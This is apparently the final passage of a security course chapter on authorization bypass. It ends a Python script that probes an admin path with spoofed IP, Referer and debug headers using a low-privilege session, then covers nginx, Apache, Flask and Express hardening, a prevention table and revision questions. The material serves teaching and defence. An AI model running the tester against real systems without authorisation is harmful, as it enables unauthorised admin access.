        for hdr, val in ip_headers.items():
            self.test_request('GET', p, {hdr: val}, f"{hdr}: {val}")
        
        # 5. Referer Bypass
        print("\n[*] Referer/Origin Bypass:")
        ref_tests = [
            {'Referer': f'{self.base_url}/admin/dashboard'},
            {'Referer': 'https://evil.com/admin'},
            {'Origin': 'null'},
        ]
        for headers in ref_tests:
            key = list(headers.keys())[0]
            self.test_request('GET', p, headers, f"{key}: {headers[key]}")
        
        # 6. Custom Headers
        print("\n[*] Custom Header Bypass:")
        custom = [
            {'X-Internal': 'true'},
            {'X-Debug': 'true'},
            {'X-Internal-Service': 'true'},
        ]
        for headers in custom:
            key = list(headers.keys())[0]
            self.test_request('GET', p, headers, f"{key}: {headers[key]}")
        
        # Summary
        bypasses = [r for r in self.results if r.get('bypass')]
        print(f"\n{'='*80}")
        print(f"Summary: {len(bypasses)} potential bypasses out of "
              f"{len(self.results)} tests")
        if bypasses:
            print("\nPotential Bypasses Found:")
            for b in bypasses:
                print(f"  [{b['status']}] {b['method']} {b['path']} "
                      f"({b['desc']})")
        print(f"{'='*80}")

# Usage
tester = AuthBypassTester(
    base_url="https://target.com",
    session_cookie="session=REGULAR_USER_TOKEN",
    target_path="/admin/users"
)
tester.run_all_tests()
```

---

## 10. Prevention & Remediation

### 10.1 Defense-in-Depth Architecture

```
+──────────────────────────────────────────────────────────────+
│        Defense-in-Depth Authorization Architecture           │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Layer 1: NETWORK / INFRASTRUCTURE                           │
│  ├── WAF with proper path normalization                      │
│  ├── API Gateway with centralized auth                       │
│  ├── Network segmentation (admin on internal only)           │
│  └── TLS termination at trusted proxy                        │
│                                                              │
│  Layer 2: WEB SERVER / REVERSE PROXY                         │
│  ├── Block dangerous HTTP methods                            │
│  ├── Normalize paths before routing                          │
│  ├── Strip method override headers                           │
│  └── Set trusted proxy configuration                         │
│                                                              │
│  Layer 3: APPLICATION FRAMEWORK                              │
│  ├── Centralized authorization middleware                     │
│  ├── Default deny policy                                     │
│  ├── Validate all HTTP methods                               │
│  └── Framework-level security configuration                  │
│                                                              │
│  Layer 4: BUSINESS LOGIC                                     │
│  ├── Per-endpoint authorization checks                       │
│  ├── Resource ownership verification                         │
│  ├── Multi-step process validation (every step)              │
│  └── Audit logging                                           │
│                                                              │
│  Layer 5: DATABASE                                           │
│  ├── Row-Level Security                                      │
│  ├── Parameterized queries (prevent injection)               │
│  └── Principle of least privilege for DB accounts            │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 10.2 Secure Server Configuration

**Nginx:**

```nginx
# Strip method override headers
proxy_set_header X-HTTP-Method-Override "";
proxy_set_header X-Method-Override "";

# Restrict HTTP methods globally
if ($request_method !~ ^(GET|POST|PUT|DELETE|PATCH)$) {
    return 405;
}

# Normalize paths (Nginx does this by default with merge_slashes)
merge_slashes on;

# Set trusted proxy for IP headers
set_real_ip_from 10.0.0.0/8;
set_real_ip_from 172.16.0.0/12;
real_ip_header X-Forwarded-For;
real_ip_recursive on;

# Block admin paths from external access
location /admin {
    allow 10.0.0.0/8;
    deny all;
    
    # Also require authentication
    auth_basic "Admin Area";
    auth_basic_user_file /etc/nginx/.htpasswd;
    
    proxy_pass http://backend;
}
```

**Apache:**

```apache
# Disable TRACE method
TraceEnable Off

# Restrict methods
<Location />
    <LimitExcept GET POST PUT DELETE PATCH>
        Require all denied
    </LimitExcept>
</Location>

# Trusted proxy configuration
RemoteIPHeader X-Forwarded-For
RemoteIPTrustedProxy 10.0.0.0/8
```

### 10.3 Application-Level Fixes

```python
# Flask: Middleware to strip bypass headers
@app.before_request
def security_middleware():
    # Strip method override headers
    dangerous_headers = [
        'X-HTTP-Method-Override', 'X-HTTP-Method',
        'X-Method-Override', 'X-Original-Method'
    ]
    for header in dangerous_headers:
        if header in request.headers:
            abort(400, f"Header {header} not allowed")
    
    # Strip spoofed IP headers (unless from trusted proxy)
    if request.remote_addr not in TRUSTED_PROXIES:
        # Don't trust X-Forwarded-For from non-proxy sources
        pass
    
    # Normalize path
    normalized = os.path.normpath(request.path)
    if normalized != request.path:
        abort(400, "Invalid path")
```

```javascript
// Express.js: Security middleware
const helmet = require('helmet');

// Remove method override in production
// DO NOT use method-override package in production

// Block dangerous headers
app.use((req, res, next) => {
  const blocked = [
    'x-http-method-override', 'x-http-method',
    'x-method-override', 'x-original-method'
  ];
  for (const header of blocked) {
    if (req.headers[header]) {
      return res.status(400).json({ error: 'Blocked header' });
    }
  }
  next();
});

// Trust proxy only from known addresses
app.set('trust proxy', ['10.0.0.0/8', '172.16.0.0/12']);
```

### 10.4 Prevention Summary

| Bypass Type | Prevention |
|---|---|
| **HTTP Verb Tampering** | Enforce auth on ALL methods, not just GET/POST. Block method overrides in production. |
| **Path Manipulation** | Normalize paths before authorization. Use framework routing, not regex. |
| **IP Spoofing** | Only trust IP headers from known proxies. Use `set_real_ip_from` / `trust proxy`. |
| **Referer Bypass** | Never use Referer for authorization. Use CSRF tokens instead. |
| **Multi-Step Bypass** | Validate authorization at EVERY step, not just the first. |
| **Header Bypass** | Strip/block custom bypass headers. Don't use debug headers in production. |
| **Race Conditions** | Use database-level locking. Implement idempotency keys. |
| **Encoding Bypass** | Normalize and decode before authorization check. Use framework routing. |

---

## Summary Table

| Topic | Key Point |
|---|---|
| **HTTP Verb Tampering** | Auth only on GET/POST → PUT/DELETE bypass |
| **Method Override** | X-HTTP-Method-Override headers change effective method |
| **Path Traversal** | `/user/../admin/users` bypasses path-based WAF rules |
| **Path Encoding** | URL encoding, double encoding, null bytes evade pattern matching |
| **Spring/Tomcat Bypass** | Semicolon parameters (`;param=x`) and `..;/` notation |
| **IP Spoofing** | X-Forwarded-For and similar headers trusted from untrusted sources |
| **Referer Bypass** | Referer header is client-controlled — never use for auth |
| **Multi-Step Bypass** | Skip to final action step — only first step checked auth |
| **Race Conditions** | TOCTOU — concurrent requests exploit auth check timing |
| **Custom Headers** | X-Internal, X-Debug headers skip authorization |
| **Defense** | Default deny + centralized auth + path normalization + trusted proxy config |

---

## Revision Questions

1. **An application protects admin endpoints using Apache's `<Limit GET POST>` directive. Explain three distinct ways an attacker could bypass this protection, and provide the correct configuration to prevent all three.**

2. **Describe the WAF path normalization bypass technique. How does the difference between WAF and application server path handling create a vulnerability? Provide a concrete example with request and response.**

3. **List five HTTP headers that can be used for IP-based access control bypass. For each, explain when it might be trusted legitimately and how to configure a web server to only trust it from known proxies.**

4. **You discover a multi-step admin workflow where Steps 1 and 2 check authorization but Step 3 (the action step) does not. Write a proof-of-concept exploit and explain the fix at both the architectural and code levels.**

5. **Design a comprehensive authorization bypass testing methodology for a web application. Include the specific techniques, tools, and scripts you would use for each bypass category.**

6. **Explain how the Spring framework's semicolon path parameter (`;param=value`) can be used to bypass URL-based authorization rules. Provide the exploit request and the Spring Security configuration to prevent it.**

---

*Previous: [05-jwt-security-testing.md](05-jwt-security-testing.md)*

---

*[Back to README](../README.md)*
